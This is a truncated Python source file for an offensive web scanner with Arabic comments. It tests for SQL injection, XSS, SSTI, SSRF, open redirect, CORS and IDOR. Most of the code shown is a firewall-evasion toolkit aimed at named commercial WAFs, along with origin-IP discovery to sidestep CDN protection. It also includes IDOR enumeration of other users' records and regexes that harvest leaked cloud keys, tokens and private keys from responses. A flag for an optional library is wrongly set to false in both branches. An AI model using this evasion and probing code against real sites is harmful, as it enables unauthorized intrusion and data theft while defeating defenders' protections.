#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess, os, requests, urllib3, random, time, threading, re, socket, dns.resolver
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, urljoin, unquote
from concurrent.futures import ThreadPoolExecutor
from difflib import SequenceMatcher, ndiff
import pyfiglet
import hashlib
import json
import xml.etree.ElementTree as ET
import base64
import string
import ssl
import sys
from datetime import datetime
from collections import Counter
import Levenshtein
import itertools

# محاولة استيراد curl_cffi (اختياري)
try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_AVAILABLE = False
except ImportError:
    CURL_CFFI_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== UI =====
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
B = "\033[94m"
W = "\033[0m"
C = "\033[96m"
M = "\033[95m"

# ===== CONFIG =====
SKIP_PARAMS = ["csrf", "token", "auth", "session", "nonce", "xsrf", "password", "secret", "key", "hash", "signature"]
SSRF_PARAMS = ["url", "dest", "next", "callback", "image", "file", "fetch", "src", "path", "redirect", "return", "out", "view", "dir", "show", "document", "folder", "root", "load", "read", "data"]
OPEN_REDIRECT_PARAMS = ["redirect", "return", "next", "url", "dest", "goto", "out", "view", "to"]
IDOR_PARAMS = ["id", "user_id", "customer_id", "account_id", "profile_id", "uid", "pid", "doc_id", "file_id", "order_id", "invoice_id", "transaction_id", "payment_id", "cart_id", "product_id", "item_id", "role_id", "group_id", "team_id", "org_id", "company_id", "client_id", "app_id", "device_id", "session_id", "token_id", "key_id", "reference_id", "record_id", "entry_id", "post_id", "comment_id", "message_id", "notification_id"]

# ===== COOKIES GLOBAL =====
USER_COOKIES = {}


# ===== TOOLS CHECK =====
def check_tools():
    """Check if required tools are installed"""
    tools = ['subfinder', 'httpx', 'katana', 'gau']
    missing = []

    for tool in tools:
        try:
            subprocess.run([tool, '-h'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            missing.append(tool)

    if missing:
        print(f"{R}[!] Missing tools: {', '.join(missing)}{W}")
        print(f"{Y}[*] Please install:{W}")
        print(f"    go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
        print(f"    go install github.com/projectdiscovery/httpx/cmd/httpx@latest")
        print(f"    go install github.com/projectdiscovery/katana/cmd/katana@latest")
        print(f"    go install github.com/lc/gau/v2/cmd/gau@latest")
        print(f"\n{Y}[*] Continuing with limited functionality...{W}")
        return False
    return True


# ===== WAF BYPASS TECHNIQUES =====
class AdvancedWAFBypassV2:
    """
    أحدث تقنيات تخطي WAF لعام 2026
    يشمل: Cloudflare, Akamai, Nginx ModSecurity
    """
    
    # ===== 1. JA3 Fingerprinting Bypass =====
    @staticmethod
    def get_curl_cffi_session():
        """مكتبة curl_cffi لتقليد بصمة متصفح حقيقي"""
        if CURL_CFFI_AVAILABLE:
            session = curl_requests.Session()
            session.imitate("chrome120")
            return session
        return None
    
    @staticmethod
    def get_chrome_fingerprint():
        """بصمة متصفح Chrome حقيقي لتجنب JA3 fingerprinting"""
        return {
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'Connection': 'keep-alive',
            }
        }
    
    # ===== 2. Contextual Encoding Techniques =====
    @staticmethod
    def double_url_encode(payload):
        """Double URL encoding لتخطي WAF"""
        first_encode = quote(payload)
        return quote(first_encode)
    
    @staticmethod
    def unicode_bypass(payload):
        """Unicode bypass للكلمات الممنوعة"""
        unicode_map = {
            's': '\u0073',
            'e': '\u0065',
            'l': '\u006c',
            'c': '\u0063',
            't': '\u0074',
            'u': '\u0075',
            'n': '\u006e',
            'o': '\u006f',
            'r': '\u0072',
            'a': '\u0061',
            'i': '\u0069',
            'd': '\u0064',
        }
        
        obfuscated = ""
        for char in payload:
            if char.lower() in unicode_map and random.choice([True, False]):
                obfuscated += unicode_map[char.lower()]
            else:
                obfuscated += char
        return obfuscated
    
    @staticmethod
    def hex_encoding_mixed(payload):
        """Hex encoding متقدم مع مزج"""
        result = ""
        for i, char in enumerate(payload):
            if i % 3 == 0:
                result += f"%{ord(char):02x}"
            elif i % 3 == 1:
                result += f"%25{ord(char):02x}"
            else:
                result += char
        return result
    
    # ===== 3. Payload Splitting Techniques =====
    @staticmethod
    def sql_payload_splitting(payload):
        """تقسيم payload SQL باستخدام التعليقات"""
        keywords = {
            'SELECT': 'SEL/**/ECT',
            'UNION': 'UNI/**/ON',
            'WHERE': 'WH/**/ERE',
            'FROM': 'FR/**/OM',
            'AND': 'AN/**/D',
            'OR': 'O/**/R',
            'INSERT': 'INS/**/ERT',
            'UPDATE': 'UPD/**/ATE',
            'DELETE': 'DEL/**/ETE',
            'DROP': 'DR/**/OP',
        }
        
        result = payload
        for keyword, obfuscated in keywords.items():
            result = result.replace(keyword, obfuscated)
            result = result.replace(keyword.lower(), obfuscated.lower())
        
        parts = result.split(' ')
        obfuscated_parts = []
        for part in parts:
            if random.choice([True, False]):
                part += f'/*{random.randint(1000,9999)}*/'
            obfuscated_parts.append(part)
        
        return ' '.join(obfuscated_parts)
    
    @staticmethod
    def ssti_payload_splitting(payload):
        """تقسيم payload SSTI باستخدام التعليقات"""
        if '{{' in payload and '}}' in payload:
            inner = payload[2:-2]
            split_inner = f"/*{random.randint(1000,9999)}*/".join(list(inner))
            return f"{{{{{split_inner}}}}}"
        return payload
    
    @staticmethod
    def xss_payload_splitting(payload):
        """تقسيم payload XSS باستخدام التعليقات"""
        if '<script>' in payload:
            return payload.replace('<script>', '<scr<script>ipt>').replace('</script>', '</scr</script>ipt>')
        return payload
    
    # ===== 4. HTTP Parameter Pollution (HPP) =====
    @staticmethod
    def create_hpp_url(url, param_name, malicious_payload, benign_payload='1'):
        """HTTP Parameter Pollution: إرسال البارامتر مرتين"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        
        new_query = {}
        for key, values in query.items():
            if key == param_name:
                new_query[key] = [benign_payload, malicious_payload]
            else:
                new_query[key] = values
        
        new_query_string = urlencode(new_query, doseq=True)
        return urlunparse(parsed._replace(query=new_query_string))
    
    # ===== 5. Random Case + Junk Comments =====
    @staticmethod
    def random_case_with_junk(payload):
        """Random case مع إضافة junk comments"""
        result = []
        junk_chars = ['', '/*!*/', '/**/', '/*123*/', '/*!12345*/']
        
        for char in payload:
            if char.isalpha() and random.choice([True, False]):
                char = char.upper() if char.islower() else char.lower()
            result.append(char)
            if random.random() < 0.3:
                result.append(random.choice(junk_chars))
        
        return ''.join(result)
    
    # ===== 6. Null Byte Injection =====
    @staticmethod
    def null_byte_injection(payload):
        """حقن Null Byte لتخطي parsers"""
        words = payload.split(' ')
        result = []
        for word in words:
            if len(word) > 3 and random.choice([True, False]):
                pos = random.randint(1, len(word)-1)
                result.append(word[:pos] + '%00' + word[pos:])
            else:
                result.append(word)
        return ' '.join(result)
    
    # ===== 7. Whitespace Bypass =====
    @staticmethod
    def whitespace_bypass(payload):
        """استخدام رموز بديلة للمسافة"""
        whitespace_alternatives = [
            '%0a', '%0b', '%0c', '%0d', '%09', '%a0',
            '/**/', '/*!*/', '/*123*/',
            '\t', '\n', '\r', '\f',
            '+',
        ]
        
        result = payload
        if ' ' in result:
            parts = result.split(' ')
            result = random.choice(whitespace_alternatives).join(parts)
        return result
    
    # ===== 8. Origin IP Discovery (IPS فريدة فقط) =====
    @staticmethod
    def discover_origin_ip(domain):
        """اكتشاف IP الحقيقي للسيرفر - يعرض فقط الـ IPs الفريدة"""
        print(f"{B}[*] Trying to discover origin IP for {domain}...{W}")
        
        discovered_ips = set()  # استخدام set لتجنب التكرار
        
        # DNS A records
        try:
            answers = dns.resolver.resolve(domain, 'A')
            for answer in answers:
                discovered_ips.add(str(answer))
        except:
            pass
        
        # IPv6
        try:
            answers = dns.resolver.resolve(domain, 'AAAA')
            for answer in answers:
                discovered_ips.add(f"[{answer}]")
        except:
            pass
        
        # Subdomains IPs
        common_subdomains = ['origin', 'origin-www', 'direct', 'direct-www', 'backend', 'server', 'lb', 'loadbalancer', 'www', 'api', 'mail']
        for sub in common_subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                discovered_ips.add(ip)
            except:
                pass
        
        # NS records (Name servers)
        try:
            answers = dns.resolver.resolve(domain, 'NS')
            for answer in answers:
                ns_domain = str(answer).rstrip('.')
                try:
                    ip = socket.gethostbyname(ns_domain)
                    discovered_ips.add(ip)
                except:
                    pass
        except:
            pass
        
        # MX records (Mail servers)
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            for answer in answers:
                mx_domain = str(answer.exchange).rstrip('.')
                try:
                    ip = socket.gethostbyname(mx_domain)
                    discovered_ips.add(ip)
                except:
                    pass
        except:
            pass
        
        return list(discovered_ips)  # تحويل set إلى list
    
    # ===== 9. الكل في واحد =====
    @staticmethod
    def apply_all_bypasses(payload, vuln_type='sqli'):
        """تطبيق كل تقنيات التخطي مرة واحدة"""
        payload = AdvancedWAFBypassV2.whitespace_bypass(payload)
        payload = AdvancedWAFBypassV2.random_case_with_junk(payload)
        
        if vuln_type == 'sqli':
            payload = AdvancedWAFBypassV2.sql_payload_splitting(payload)
        elif vuln_type == 'ssti':
            payload = AdvancedWAFBypassV2.ssti_payload_splitting(payload)
        elif vuln_type == 'xss':
            payload = AdvancedWAFBypassV2.xss_payload_splitting(payload)
        
        payload = AdvancedWAFBypassV2.unicode_bypass(payload)
        
        if random.choice([True, False]):
            payload = quote(payload)
        if random.choice([True, False]):
            payload = AdvancedWAFBypassV2.double_url_encode(payload)
        if random.choice([True, False]):
            payload = AdvancedWAFBypassV2.null_byte_injection(payload)
        
        return payload
    
    # ===== 10. WAF Detection =====
    @staticmethod
    def detect_waf(response):
        """اكتشاف نوع WAF من الـ response"""
        if not response:
            return None
        
        headers = response.headers
        body = response.text.lower() if response.text else ""
        
        waf_signatures = {
            'Cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id'],
                'body': ['cloudflare', 'cf-ray', 'always online']
            },
            'Akamai': {
                'headers': ['x-akamai-transformed', 'x-akamai-request-id'],
                'body': ['akamaighost', 'akamai', 'edgecast']
            },
            'AWS WAF': {
                'headers': ['x-amz-cf-id', 'x-amz-cf-pop'],
                'body': ['aws', 'amazon web services', 'cloudfront']
            },
            'Sucuri': {
                'headers': ['x-sucuri-id', 'x-sucuri-cache'],
                'body': ['sucuri', 'cloudproxy']
            },
            'Incapsula': {
                'headers': ['x-iinfo', 'x-cdn'],
                'body': ['incapsula', 'imperva']
            },
            'ModSecurity': {
                'headers': [],
                'body': ['mod_security', 'modsecurity', 'web application firewall']
            },
            'F5 BIG-IP': {
                'headers': ['x-aspm-rule', 'x-waf'],
                'body': ['f5', 'big-ip', 'application security manager']
            }
        }
        
        detected = []
        for waf_name, signatures in waf_signatures.items():
            for header in signatures['headers']:
                if header in headers:
                    detected.append(waf_name)
                    break
            for pattern in signatures['body']:
                if pattern in body:
                    if waf_name not in detected:
                        detected.append(waf_name)
                    break
        
        return list(set(detected)) if detected else None
    
    # ===== 11. WAF-Specific Bypass =====
    @staticmethod
    def bypass_for_waf(payload, waf_type):
        """تطبيق bypass مخصص لنوع معين من WAF"""
        if waf_type == 'Cloudflare':
            payload = AdvancedWAFBypassV2.unicode_bypass(payload)
            payload = AdvancedWAFBypassV2.double_url_encode(payload)
        elif waf_type == 'Akamai':
            payload = AdvancedWAFBypassV2.random_case_with_junk(payload)
            payload = AdvancedWAFBypassV2.hex_encoding_mixed(payload)
        elif waf_type == 'AWS WAF':
            payload = AdvancedWAFBypassV2.sql_payload_splitting(payload)
            payload = AdvancedWAFBypassV2.unicode_bypass(payload)
        elif waf_type == 'ModSecurity':
            payload = AdvancedWAFBypassV2.whitespace_bypass(payload)
            payload = AdvancedWAFBypassV2.null_byte_injection(payload)
        return payload


# ===== RESPONSE SIMILARITY ENGINE =====
class ResponseSimilarityEngine:
    """Advanced response comparison engine with dynamic content detection"""

    @staticmethod
    def levenshtein_distance(text1, text2):
        if not text1 or not text2:
            return 1.0
        return Levenshtein.distance(text1[:1000], text2[:1000]) / max(len(text1[:1000]), len(text2[:1000]))

    @staticmethod
    def structural_similarity(text1, text2):
        if not text1 or not text2:
            return 1.0
        tags1 = re.findall(r'<[^>]+>', text1)
        tags2 = re.findall(r'<[^>]+>', text2)
        if not tags1 or not tags2:
            return 1.0
        common = set(tags1[:50]) & set(tags2[:50])
        return len(common) / max(len(set(tags1[:50])), len(set(tags2[:50])))

    @staticmethod
    def dom_diff(text1, text2):
        if not text1 or not text2:
            return 1.0
        elements1 = Counter(re.findall(r'<(\w+)', text1))
        elements2 = Counter(re.findall(r'<(\w+)', text2))
        if not elements1 or not elements2:
            return 1.0
        total_elements = sum(elements1.values()) + sum(elements2.values())
        diff_elements = sum(abs(elements1.get(k, 0) - elements2.get(k, 0)) for k in set(elements1) | set(elements2))
        return diff_elements / total_elements if total_elements > 0 else 1.0

    @staticmethod
    def calculate_similarity_ratio(text1, text2):
        if not text1 or not text2:
            return 0.0
        scores = {
            'levenshtein': 1 - ResponseSimilarityEngine.levenshtein_distance(text1, text2),
            'structural': ResponseSimilarityEngine.structural_similarity(text1, text2),
            'dom': 1 - ResponseSimilarityEngine.dom_diff(text1, text2)
        }
        weights = {'levenshtein': 0.4, 'structural': 0.3, 'dom': 0.3}
        return sum(scores[k] * weights[k] for k in weights)


# ===== BASELINE PROFILER =====
class BaselineProfiler:
    """Create and manage baseline fingerprints for URLs"""

    def __init__(self, cookies=None):  # أضفنا cookies هنا
        self.baselines = {}
        self.session = requests.Session()
        self.session.verify = False
        if cookies:  # أضف الكوكيز إذا وجدت
            self.session.cookies.update(cookies)
        
        # تعطيل curl_session مؤقتاً
        self.curl_session = None
        self.use_curl = False
        
        # لو عايز تجرب curl_cffi
        if CURL_CFFI_AVAILABLE:
            try:
                self.curl_session = AdvancedWAFBypassV2.get_curl_cffi_session()
                if self.curl_session and cookies:
                    self.curl_session.cookies.update(cookies)
                self.use_curl = True
            except:
                self.curl_session = None
                self.use_curl = False

    def create_baseline(self, url, use_curl=False):
        """Create comprehensive baseline for a URL"""
        try:
            clean_url = url.split('?')[0] if '?' in url else url
            headers = AdvancedWAFBypassV2.get_chrome_fingerprint()['headers']
            
            if use_curl and CURL_CFFI_AVAILABLE and hasattr(self, 'curl_session') and self.curl_session:
                resp = self.curl_session.get(clean_url, headers=headers, timeout=10, verify=False)
            else:
                resp = self.session.get(clean_url, headers=headers, timeout=10, verify=False)

            title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE | re.DOTALL)
            title = title_match.group(1).strip() if title_match else ''

            waf_detected = AdvancedWAFBypassV2.detect_waf(resp)

            baseline = {
                'url': clean_url,
                'status': resp.status_code,
                'length': len(resp.text),
                'hash': hashlib.md5(resp.text.encode()).hexdigest(),
                'title': title,
                'headers': dict(resp.headers),
                'body_preview': resp.text[:1000],
                'timestamp': time.time(),
                'content_type': resp.headers.get('content-type', ''),
                'words': len(resp.text.split()),
                'lines': len(resp.text.split('\n')),
                'forms': len(re.findall(r'<form', resp.text, re.IGNORECASE)),
                'inputs': len(re.findall(r'<input', resp.text, re.IGNORECASE)),
                'scripts': len(re.findall(r'<script', resp.text, re.IGNORECASE)),
                'links': len(re.findall(r'<a', resp.text, re.IGNORECASE)),
                'cookies': resp.cookies.get_dict(),
                'waf_detected': waf_detected
            }

            self.baselines[clean_url] = baseline
            return baseline
        except Exception as e:
            print(f"Error creating baseline: {e}")
            return None

    def get_baseline(self, url):
        clean_url = url.split('?')[0]
        if clean_url not in self.baselines:
            return self.create_baseline(clean_url)
        return self.baselines.get(clean_url)

    def get_payload_fingerprint(self, url, param, payload, use_curl=False):
        """Get fingerprint for response with payload"""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query, keep_blank_values=True)

            if param in query:
                new_query = query.copy()
                new_query[param] = [payload]
                new_query_string = urlencode(new_query, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query_string))
            else:
                test_url = f"{url}?{param}={quote(payload)}"

            headers = AdvancedWAFBypassV2.get_chrome_fingerprint()['headers']
            
            if use_curl and CURL_CFFI_AVAILABLE and hasattr(self, 'curl_session') and self.curl_session:
                resp = self.curl_session.get(test_url, headers=headers, timeout=10, verify=False)
            else:
                resp = requests.get(test_url, headers=headers, timeout=10, verify=False)

            title_match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE | re.DOTALL)
            title = title_match.group(1).strip() if title_match else ''

            return {
                'status': resp.status_code,
                'length': len(resp.text),
                'hash': hashlib.md5(resp.text.encode()).hexdigest(),
                'title': title,
                'body_preview': resp.text[:1000]
            }
        except Exception as e:
            print(f"Error getting payload fingerprint: {e}")
            return None

    def compare_with_baseline(self, baseline, payload_fingerprint):
        if not baseline or not payload_fingerprint:
            return {'similarity': 0, 'details': {}}
        similarity = ResponseSimilarityEngine.calculate_similarity_ratio(
            baseline.get('body_preview', ''),
            payload_fingerprint.get('body_preview', '')
        )
        return {'similarity': similarity}


# ===== REFLECTION CONTEXT ANALYZER =====
class ReflectionContextAnalyzer:
    """Analyze reflection context for XSS detection"""

    @staticmethod
    def analyze_reflection(response_text, marker):
        if not response_text or marker not in response_text:
            return {'reflected': False}

        results = {
            'reflected': True,
            'contexts': [],
            'is_executable': False,
            'is_escaped': False,
            'count': response_text.count(marker)
        }

        script_pattern = f'<script[^>]*>.*{re.escape(marker)}.*</script>'
        if re.search(script_pattern, response_text, re.IGNORECASE | re.DOTALL):
            results['contexts'].append('script')
            results['is_executable'] = True

        attr_pattern = f'=[\'"][^\'"]*{re.escape(marker)}[^\'"]*[\'"]'
        if re.search(attr_pattern, response_text):
            results['contexts'].append('attribute')
            results['is_executable'] = True

        html_pattern = f'>[^<]*{re.escape(marker)}[^<]*<'
        if re.search(html_pattern, response_text):
            results['contexts'].append('html_text')

        if '\\' + marker in response_text or '&lt;' in response_text:
            results['is_escaped'] = True

        return results


# ===== CONFIDENCE SCORER =====
class ConfidenceScorer:
    @staticmethod
    def calculate_confidence(vuln_type, evidence):
        base_scores = {
            'sqli': 0.5, 'xss': 0.5, 'rce': 0.7, 'lfi': 0.6,
            'ssrf': 0.5, 'open_redirect': 0.4, 'cors': 0.4, 'ssti': 0.6, 'idor': 0.7
        }
        confidence = base_scores.get(vuln_type, 0.3)
        
        if evidence.get('verified'):
            confidence += 0.2
        if evidence.get('multiple_payloads'):
            confidence += 0.1
        if evidence.get('reflection_context') == 'executable':
            confidence += 0.2
        if evidence.get('bypassed_waf'):
            confidence += 0.1
        if evidence.get('accessed_other_user_data'):
            confidence += 0.3
        
        confidence = min(confidence, 1.0)
        
        if confidence >= 0.9:
            level = 'HIGH'
        elif confidence >= 0.6:
            level = 'MEDIUM'
        else:
            level = 'LOW'
        
        return {'score': confidence, 'level': level}

    @staticmethod
    def calculate_severity(vuln_type, context, confidence):
        severity_map = {
            'sqli': 'CRITICAL', 'rce': 'CRITICAL', 'lfi': 'HIGH',
            'ssrf': 'HIGH', 'ssti': 'CRITICAL', 'xss': 'HIGH',
            'open_redirect': 'MEDIUM', 'cors': 'MEDIUM', 'idor': 'CRITICAL'
        }
        base = severity_map.get(vuln_type, 'INFO')
        if confidence['level'] == 'LOW' and base in ['CRITICAL', 'HIGH']:
            return 'MEDIUM'
        if context.get('sensitive_data') and base == 'HIGH':
            return 'CRITICAL'
        return base


# ===== SSRF TRIGGER INTELLIGENCE =====
class SSRFTriggerIntelligence:
    def __init__(self):
        self.dns_cache = {}

    def looks_like_url(self, param_value):
        if not param_value:
            return False
        url_patterns = [
            r'^https?://', r'^ftp://', r'^file://',
            r'^\d+\.\d+\.\d+\.\d+', r'^localhost', r'^127\.'
        ]
        return any(re.match(pattern, param_value.lower()) for pattern in url_patterns)

    def has_fetch_behavior(self, response):
        if not response:
            return False
        indicators = ['fetch', 'xmlhttp', 'ajax', 'request', 'curl', 'wget']
        return any(ind in response.text.lower() for ind in indicators)

    def should_test_ssrf(self, url, param_name, param_value, response):
        if param_name.lower() in SSRF_PARAMS:
            return True
        if self.looks_like_url(param_value):
            return True
        if response and self.has_fetch_behavior(response):
            return True
        return False


# ===== OPEN REDIRECT STRICT VALIDATOR =====
class OpenRedirectStrictValidator:
    @staticmethod
    def validate_redirect(url, response, payload):
        if not response or response.status_code not in [301, 302, 303, 307, 308]:
            return False
        location = response.headers.get('Location', '')
        if not location:
            return False
        
        parsed_location = urlparse(location)
        parsed_original = urlparse(url)
        
        if not (parsed_location.scheme and parsed_location.netloc):
            return False
        if parsed_location.netloc == parsed_original.netloc:
            return False
        if parsed_location.netloc.endswith('.' + parsed_original.netloc):
            return False
        
        evil_domains = ['evil.com', 'attacker.com', 'malicious.com']
        if not any(evil in location for evil in evil_domains):
            return False
        
        return True


# ===== ADVANCED FALSE POSITIVE FILTER =====
class AdvancedFalsePositiveFilter:
    @staticmethod
    def is_html_page(text):
        if not text:
            return False
        html_indicators = ['<!DOCTYPE', '<html', '<head', '<body', '<script', '<style']
        text_start = text[:500].lower()
        return any(indicator.lower() in text_start for indicator in html_indicators)

    @staticmethod
    def is_json_response(text):
        if not text:
            return False
        text = text.strip()
        return text.startswith('{') or text.startswith('[')

    @staticmethod
    def is_xml_response(text):
        if not text:
            return False
        text = text.strip()
        return text.startswith('<?xml') or text.startswith('<soap:')

    @staticmethod
    def is_error_page(text):
        if not text:
            return False
        error_patterns = [r'404', r'403', r'500', r'error', r'not found']
        text_lower = text.lower()
        return any(re.search(pattern, text_lower, re.IGNORECASE) for pattern in error_patterns)

    @staticmethod
    def is_waf_block_page(text):
        if not text:
            return False
        waf_patterns = [r'cloudflare', r'incapsula', r'akamai', r'access denied']
        text_lower = text.lower()
        return any(re.search(pattern, text_lower, re.IGNORECASE) for pattern in waf_patterns)

    @staticmethod
    def contains_real_rce_output(text, payload):
        if not text:
            return False
        if (AdvancedFalsePositiveFilter.is_html_page(text) or
            AdvancedFalsePositiveFilter.is_json_response(text) or
            AdvancedFalsePositiveFilter.is_xml_response(text) or
            AdvancedFalsePositiveFilter.is_error_page(text) or
            AdvancedFalsePositiveFilter.is_waf_block_page(text)):
            return False
        rce_patterns = [
            r'uid=\d+\(\w+\)', r'gid=\d+\(\w+\)', r'root:.*:0:0:',
            r'Microsoft Windows', r'Volume in drive'
        ]
        for pattern in rce_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    @staticmethod
    def contains_database_error_indicators(text):
        if not text:
            return False
        indicators = ['sql', 'database', 'mysql', 'postgres', 'oracle', 'syntax error']
        text_lower = text.lower()
        return any(ind in text_lower for ind in indicators)

    @staticmethod
    def is_real_ssti(text, payload):
        if not text:
            return False
        if AdvancedFalsePositiveFilter.is_error_page(text) or AdvancedFalsePositiveFilter.is_waf_block_page(text):
            return False
        if '999*999' in payload and '998001' in text:
            if '999*999' not in text:
                return True
        return False

    @staticmethod
    def is_real_cors_vulnerable(response):
        if not response:
            return False
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '').lower()
        origin = response.request.headers.get('Origin', '')
        if not acao:
            return False
        if acao == '*' and acac == 'true':
            return {'level': 'CRITICAL', 'reason': 'Wildcard origin with credentials'}
        if acao == origin and acac == 'true':
            return {'level': 'HIGH', 'reason': 'Origin reflection with credentials'}
        return False

    @staticmethod
    def contains_real_secrets(text):
        if not text:
            return False
        patterns = {
            'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'JWT Token': r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
            'AWS Secret Key': r'(?i)aws_secret_access_key["\']?\s*[:=]\s*["\']?([0-9a-zA-Z/+]{40})',
            'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
            'SSH Private Key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            'Database URL': r'(mysql|postgres|mongodb)://[^"\'\s]+',
        }
        findings = []
        for name, pattern in patterns.items():
            matches = re.findall(pattern, text)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                if match:
                    findings.append({'type': name, 'value': match})
        return findings if findings else False

    @staticmethod
    def is_valid_xxe_response(text, payload):
        if not text:
            return False
        file_indicators = [r'root:x:', r'bin:x:', r'daemon:x:', r'C:\\Windows']
        for indicator in file_indicators:
            if re.search(indicator, text):
                if not any(err in text.lower() for err in ['error', 'warning']):
                    return True
        return False


# ===== IDOR INTELLIGENCE ENGINE =====
class IDORIntelligenceEngine:
    """
    محرك ذكي لاكتشاف ثغرات IDOR
    يقوم بتحليل الأنماط واكتشاف الوصول غير المصرح به للبيانات
    """
    
    def __init__(self, scanner):
        self.scanner = scanner
        self.id_patterns = {
            'numeric': r'\b\d+\b',
            'uuid': r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b',
            'base64': r'^[A-Za-z0-9+/]+=*$',
            'hash': r'\b[0-9a-f]{32}\b|\b[0-9a-f]{40}\b|\b[0-9a-f]{64}\b',
            'email': r'\b[\w\.-]+@[\w\.-]+\.\w+\b'
        }
        self.discovered_ids = {}
        self.user_boundaries = {}
        
    def extract_ids_from_response(self, response_text, context_url):
        """استخراج IDs محتملة من الاستجابة"""
        ids_found = {
            'numeric': [],
            'uuid': [],
            'email': [],
            'hash': []
        }
        
        for id_type, pattern in self.id_patterns.items():
            matches = re.findall(pattern, response_text)
            unique_matches = set(matches)
            filtered = [m for m in unique_matches if len(m) > 2 and len(m) < 100]
            ids_found[id_type] = list(filtered[:10])
        
        return ids_found
    
    def generate_id_variations(self, original_id, id_type='numeric'):
        """توليد تباينات من ID معين"""
        variations = []
        
        if id_type == 'numeric':
            try:
                num = int(original_id)
                for i in range(-5, 6):
                    if i != 0 and num + i > 0:
                        variations.append(str(num + i))
                common_ids = ['1', '2', '3', '10', '100', '1000', '9999', '12345', '99999', '100000', '999999', '1000000']
                variations.extend(common_ids)
            except:
                pass
                
        elif id_type == 'uuid':
            if '-' in original_id:
                parts = original_id.split('-')
                if len(parts) == 5:
                    for i in range(1, 6):
                        new_parts = parts.copy()
                        try:
                            last_part = int(parts[-1], 16)
                            new_parts[-1] = format(last_part + i, 'x').zfill(len(parts[-1]))
                            variations.append('-'.join(new_parts))
                        except:
                            pass
        
        elif id_type == 'email':
            if '@' in original_id:
                local, domain = original_id.split('@')
                common_domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'company.com', 'test.com']
                for new_domain in common_domains[:3]:
                    variations.append(f"{local}@{new_domain}")
        
        return list(set(variations[:15]))
    
    def detect_user_boundaries(self, url, param_name, original_value):
        """اكتشاف حدود المستخدم"""
        try:
            original_url = self.scanner.inject_specific_param(url, param_name, original_value)
            original_resp = self.scanner.get_response(original_url)
            
            if not original_resp:
                return None
            
            baseline = {
                'status': original_resp.status_code,
                'length': len(original_resp.text),
                'hash': hashlib.md5(original_resp.text.encode()).hexdigest(),
                'content': original_resp.text[:500]
            }
            
            same_url = self.scanner.inject_specific_param(url, param_name, original_value)
            same_resp = self.scanner.get_response(same_url)
            
            if same_resp:
                same_hash = hashlib.md5(same_resp.text.encode()).hexdigest()
                if same_hash != baseline['hash']:
                    return {'dynamic': True, 'baseline': baseline}
            
            self.user_boundaries[f"{url}|{param_name}"] = {
                'original_value': original_value,
                'baseline': baseline
            }
            
            return {'dynamic': False, 'baseline': baseline}
            
        except:
            return None
    
    def test_idor_for_param(self, url, param_name):
        """اختبار IDOR متقدم لبارامتر معين"""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query, keep_blank_values=True)
            original_value = query.get(param_name, [''])[0] if param_name in query else ''
            
            if not original_value:
                return None
            
            id_type = 'numeric'
            for idt, pattern in self.id_patterns.items():
                if re.match(pattern, original_value):
                    id_type = idt
                    break
            
            print(f"{B}[IDOR] Testing parameter: {param_name} (Type: {id_type}, Value: {original_value}){W}")
            
            boundaries = self.detect_user_boundaries(url, param_name, original_value)
            if not boundaries:
                return None
            
            if boundaries.get('dynamic'):
                print(f"{Y}[IDOR] Page is dynamic, IDOR tests may be unreliable{W}")
            
            variations = self.generate_id_variations(original_value, id_type)
            random_ids = ['999999999', '0', '-1', 'null', 'undefined', 'NaN', 'Infinity', '1e6', '0xffff']
            variations.extend(random_ids)
            variations = [v for v in variations if v != original_value]
            variations = list(set(variations))[:20]
            
            print(f"{G}[IDOR] Generated {len(variations)} variations to test{W}")
            
            findings = []
            baseline = boundaries['baseline']
            
            for i, test_value in enumerate(variations):
                try:
                    test_url = self.scanner.inject_specific_param(url, param_name, test_value)
                    resp = self.scanner.get_response(test_url)
                    
                    if not resp:
                        continue
                    
                    current_hash = hashlib.md5(resp.text.encode()).hexdigest()
                    length_ratio = abs(len(resp.text) - baseline['length']) / max(baseline['length'], 1)
                    
                    idor_detected = False
                    confidence_factors = []
                    
